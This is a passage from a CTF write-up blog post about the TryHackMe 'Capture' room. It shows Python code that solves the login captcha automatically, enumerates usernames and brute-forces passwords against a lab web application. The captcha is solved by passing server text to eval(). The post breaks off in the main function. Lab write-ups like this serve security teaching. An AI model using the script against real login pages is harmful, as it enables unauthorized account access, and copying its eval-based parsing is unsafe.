---
title: Capture: A TryHackMe CTF writeup
url: https://infosecwriteups.com/capture-a-tryhackme-ctf-writeup-4a5404600120?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-11-09
fetch_date: 2025-11-10T03:17:38.711734
---

# Capture: A TryHackMe CTF writeup

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F4a5404600120&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcapture-a-tryhackme-ctf-writeup-4a5404600120&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcapture-a-tryhackme-ctf-writeup-4a5404600120&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-4a5404600120---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-4a5404600120---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Capture: A TryHackMe CTF writeup

[![Huzaifa Malik](https://miro.medium.com/v2/resize:fill:64:64/1*OmgdxjZTX_D87jmOud0tMw.jpeg)](https://medium.com/%40huzaifa_X_malik?source=post_page---byline--4a5404600120---------------------------------------)

[Huzaifa Malik](https://medium.com/%40huzaifa_X_malik?source=post_page---byline--4a5404600120---------------------------------------)

5 min read

·

1 day ago

--

Listen

Share

In this write-up, we are going to bypass the login form of a vulnerable web application and then using Python script to automate the process

**Room Link**: <https://tryhackme.com/room/capture>

**Room Description**: *SecureSolaCoders* has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly

Press enter or click to view image in full size

![]()

**AI** generated

### Gettting ready to hunt

* Start the target machine & Download Task Files
* Boot your attack box
* Connect to the TryHackMe network

Press enter or click to view image in full size

![]()

Download Task Files

## 1️⃣ Analyze the Task Files

Once you download and unzip the Task Files, here is what it contains

![]()

Task Files

From the above files (**username.txt** & **passwords.txt**) we can say that the task is to brute force the login page and find the correct credentials

## 2️⃣Understanding the Login page functionality

You might encounter following web page when you first visit the IP address in your browser

Press enter or click to view image in full size

![]()

Login Page

After trying multiple incorrect credentials from the task files (**username.txt** & **password.txt**), captcha was enabled to prevent brute force attacks

Press enter or click to view image in full size

![]()

Captcha enabled

So, we need to solve the captcha each time to verify the username and password. Let’s capture this request in BurpSuite

![]()

POST request captured in BurpSuite

Above you can see the parameters that a **POST** request contains, so it is clear that we have to pass these three parameters on each request to verify the **username** & **password**

## 3️⃣Code the process

To automate this process I developed my custom python script to find the correct credentials. Following are the code snippets of the python script along explanation to each function used in the script:

**1. Import required libraries**

```
import sys
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

s=requests.session()
reg_pattern= r'\d{1,}\s(.)\s\d{1,}'
```

`import sys` It provides access to system parameters and allowing users to interact with the program such as taking a parameter value from user

`import requests` to deal with web requests and response from the server

`import urllib3` to deal with URLs

`import re` using regular expression tool to match for specific patters

the `proxies` variable contains the value to web proxy server, in this case we are using BurpSuite

`reg_pattern` is the pattern to extract captcha value from the response and perform operations on it

**2. Extract captcha from the response**

```
def get_captcha(url):
    data= {'username':'test','password':'testpass'} #Missing captcha
    res=s.post(url=url, proxies=proxies, verify=False, data=data)

    challenge=re.search(reg_pattern, res.text)
    solution=eval(challenge.group().strip())
    return solution
```

this function is used to make web request and solve the captcha challenge from the response using in-built `eval()` function

**3. Enumerate username**

From the response, you can see that website says ‘**The user** rachel **does not exist**’ instead it should response that ‘**The username or password is invalid**’ . This improper response allows attacker to enumerate the username:

```
def user_enum(url,user_list,captcha):
    print("(+) Enumerating users...")

    with open(user_list, 'r') as file:
        for username in file:
            username = username.strip()
            if username:
                data={'username':username,'password':'testpass','captcha':captcha}
                res=s.post(url=url, proxies=proxies, verify=False, data=data)

                if "does not exist" in res.text:
                    print(username)
                elif "Invalid captcha" in res.text:
                    print("[-] Invalid captcha")
                else:
                    print(f"[+] Username found: {username}")
                    return username, captcha
                challenge=re.search(reg_pattern, res.text)
                captcha=eval(challenge.group().strip())
```

**4. Enumerate password**

After finding the valid username `pass_enum` function is called to enumerate the password

```
def pass_enum(url, username, pass_list, captcha):
    print("(+) Enumerating password...")

    with open(pass_list, 'r') as file:
        for password in file:
            password = password.strip()
            if password:
                data= {'username':username,'password':password,'captcha':captcha}
                res=requests.post(url=url, proxies=proxies, verify=False, data=data)

                if "Invalid password" in res.text:
                    print(f"{username}:{password}")
                elif "Invalid captcha" in res.text:
                    print("[-] Invalid captcha")
                else:
                    print(f"[+] Password found: {password}")
                    return password
                challenge=re.search(reg_pattern, res.text)
                captcha=eval(challenge.group().strip())
```

**Main function**

Input required values from the user and call the functions as required

```
if __name__ == "__main__":
    if len(sys.argv)!=4:
        print("[+] Usage: %s URL p...